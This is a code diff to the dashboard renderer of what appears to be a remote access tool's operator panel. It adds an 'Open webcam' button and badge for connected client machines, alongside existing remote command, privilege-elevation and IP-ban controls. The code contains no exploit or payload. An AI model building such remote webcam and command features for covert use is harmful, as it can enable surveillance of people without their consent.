@@ -321,6 +321,7 @@ export function createRenderer({
   requestPreview,
   requestThumbnail,
   pingClient,
+  onOpenWebcam,
   onMacPermissionRequest,
   onMacPermissionRefresh,
   onMacPermissionApply,
@@ -476,6 +477,12 @@ export function createRenderer({
         e.stopPropagation();
         const rect = e.target.closest(".kebab-btn").getBoundingClientRect();
         openMenu(clientId, rect.right, rect.bottom);
+        return;
+      }
+
+      if (e.target.closest(".cv-webcam-btn")) {
+        e.stopPropagation();
+        if (onOpenWebcam) onOpenWebcam(clientId);
         return;
       }
 
@@ -655,7 +662,7 @@ export function createRenderer({
   }
 
   function cardDigest(c) {
-    return `${currentDisplayDigest}|${currentLayout}|${c.id}|${!!c.online}|${c.lastSeen}|${c.pingMs}|${c.host}|${c.user}|${c.os}|${c.arch}|${c.version}|${c.monitors}|${c.country}|${c.nickname}|${c.customTag}|${c.customTagNote}|${!!c.bookmarked}|${!!c.isAdmin}|${c.elevation}|${JSON.stringify(c.permissions || {})}|${c.cpu}|${c.gpu}|${c.ram}|${c.batteryPercent}|${c.batteryCharging}|${c.hwid}|${c.disconnectReason}|${c.disconnectDetail}|${c.groupId}|${c.groupName}|${c.groupColor}|${!!c.notificationsMuted}`;
+    return `${currentDisplayDigest}|${currentLayout}|${c.id}|${!!c.online}|${c.lastSeen}|${c.pingMs}|${c.host}|${c.user}|${c.os}|${c.arch}|${c.version}|${c.monitors}|${c.country}|${c.nickname}|${c.customTag}|${c.customTagNote}|${!!c.bookmarked}|${!!c.isAdmin}|${c.elevation}|${JSON.stringify(c.permissions || {})}|${c.cpu}|${c.gpu}|${c.ram}|${c.batteryPercent}|${c.batteryCharging}|${!!c.webcamAvailable}|${JSON.stringify(c.webcamDevices || [])}|${c.hwid}|${c.disconnectReason}|${c.disconnectDetail}|${c.groupId}|${c.groupName}|${c.groupColor}|${!!c.notificationsMuted}`;
   }
 
   function cardThumbDigest(c) {
@@ -789,6 +796,7 @@ export function createRenderer({
     el.dataset.customTag = String(client.customTag || "");
     el.dataset.bookmarked = String(!!client.bookmarked);
     el.dataset.notificationsMuted = String(!!client.notificationsMuted);
+    el.dataset.hasWebcam = String(!!client.webcamAvailable);
     el.dataset.admin = String(!!client.isAdmin);
     el.dataset.groupId = String(client.groupId || "");
     el.dataset.groupName = String(client.groupName || "");
@@ -831,6 +839,16 @@ export function createRenderer({
     }
 
     return node;
+  }
+
+  function webcamButtonHtml(client, extraClass = "") {
+    if (!client.webcamAvailable || isViewer) return "";
+    return `<button type="button" class="cv-icon-btn cv-webcam-btn ${extraClass}" title="Open webcam" aria-label="Open webcam"><i class="fa-solid fa-video"></i></button>`;
+  }
+
+  function webcamBadgeHtml(client) {
+    if (!client.webcamAvailable || isViewer) return "";
+    return `<button type="button" class="cv-mini-pill cv-pill-webcam cv-webcam-btn" title="Open webcam" aria-label="Open webcam"><i class="fa-solid fa-video"></i></button>`;
   }
 
   function updateCard(card, client) {
@@ -914,6 +932,7 @@ export function createRenderer({
           ${client.isAdmin ? `<span class="cv-mini-pill cv-pill-admin" title="Admin"><i class="fa-solid fa-shield-halved"></i></span>` : ""}
           ${client.elevation === "system" ? `<span class="cv-mini-pill cv-pill-system" title="SYSTEM"><i class="fa-solid fa-gear"></i></span>` : ""}
           ${client.elevation === "trustedinstaller" ? `<span class="cv-mini-pill cv-pill-ti" title="TrustedInstaller"><i class="fa-solid fa-lock"></i></span>` : ""}
+          ${webcamBadgeHtml(client)}
           ${macPermissionBadgeHtml(client)}
           ${client.notificationsMuted ? `<span class="cv-mini-pill cv-pill-muted" title="Notifications muted"><i class="fa-solid fa-bell-slash"></i></span>` : ""}
         </div>
@@ -930,6 +949,7 @@ export function createRenderer({
       <div class="cv-spacer"></div>
       <div class="cv-actions">
         ${isViewer ? "" : `<button class="command-btn cv-btn-primary" data-id="${escapeHtml(client.id)}"><i class="fa-solid fa-terminal"></i><span>Commands</span></button>`}
+        ${webcamButtonHtml(client)}
         <button class="cv-icon-btn cv-ping-btn" title="Ping" ${client.online ? "" : "disabled"}><i class="fa-solid fa-satellite-dish"></i></button>
         ${isViewer ? "" : `<button class="cv-icon-btn cv-icon-danger ban-btn" title="Ban IP" data-id="${escapeHtml(client.id)}"><i class="fa-solid fa-ban"></i></button>`}
         <button class="cv-icon-btn cv-expand-btn" title="More info" aria-expanded="false"><i class="fa-solid fa-chevron-down"></i></button>
@@ -993,6 +1013,7 @@ export function createRenderer({
               ${client.isAdmin ? `<span class="cv-mini-pill cv-pill-admin" title="Admin"><i class="fa-solid fa-shield-halved"></i></span>` : ""}
               ${client.elevation === "system" ? `<span class="cv-mini-pill cv-pill-system" title="SYSTEM"><i class="fa-solid fa-gear"></i></span>` : ""}
               ${client.elevation === "trustedinstaller" ? `<span class="cv-mini-pill cv-pill-ti" title="TI"><i class="fa-solid fa-lock"></i></span>` : ""}
+              ${webcamBadgeHtml(client)}
               ${macPermissionBadgeHtml(client)}
               ${client.notificationsMuted ? `<span class="cv-mini-pill cv-pill-muted" title="Notifications muted"><i class="fa-solid fa-bell-slash"></i></span>` : ""}
             </span>
@@ -1012,6 +1033,7 @@ export function createRenderer({
       <td class="cv-td-actions">
         <div class="cv-actions cv-actions-table">
           ${isViewer ? "" : `<button class="command-btn cv-btn-primary cv-btn-sm" data-id="${escapeHtml(client.id)}"><i class="fa-solid fa-terminal"></i><span>Commands</span></button>`}
+          ${webcamButtonHtml(client, "cv-icon-sm")}
           ${isViewer ? "" : `<button class="cv-icon-btn cv-icon-sm kebab-btn" title="More" data-id="${escapeHtml(client.id)}"><i class="fa-solid fa-ellipsis-vertical"></i></button>`}
         </div>
       </td>
@@ -1054,6 +1076,7 @@ export function createRenderer({
       client.isAdmin ? `<span class="cv-mini-pill cv-pill-admin" title="Admin"><i class="fa-solid fa-shield-halved"></i></span>` : "",
       client.elevation === "system" ? `<span class="cv-mini-pill cv-pill-system" title="SYSTEM"><i class="fa-solid fa-gear"></i></span>` : "",
       client.elevation === "trustedinstaller" ? `<span class="cv-mini-pill cv-pill-ti" title="TrustedInstaller"><i class="fa-solid fa-lock"></i></span>` : "",
+      webcamBadgeHtml(client),
       macPermissionBadgeHtml(client),
       client.notificationsMuted ? `<span class="cv-mini-pill cv-pill-muted" title="Notifications muted"><i class="fa-solid fa-bell-slash"></i></span>` : "",
     ].join("");
@@ -1102,6 +1125,7 @@ export function createRenderer({
         ${macPermDetail ? `<div class="cv-card-perms">${macPermDetail}</div>` : ""}
         <div class="cv-card-actions">
           ${isViewer ? "" : `<button class="command-btn cv-btn-primary cv-btn-flex" data-id="${escapeHtml(client.id)}"><i class="fa-solid fa-terminal"></i><span>Commands</span></button>`}
+          ${webcamButtonHtml(client)}
           <button class="cv-icon-btn cv-ping-btn" title="Ping" ${client.online ? "" : "disabled"}><i class="fa-solid fa-satellite-dish"></i></button>
           ${isViewer ? "" : `<button class="cv-icon-btn cv-icon-danger ban-btn" title="Ban IP" data-id="${escapeHtml(client.id)}"><i class="fa-solid fa-ban"></i></button>`}
         </div>
